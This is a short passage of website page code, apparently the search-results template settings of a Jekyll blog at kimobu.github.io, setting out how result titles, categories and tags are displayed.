pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://kimobu.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
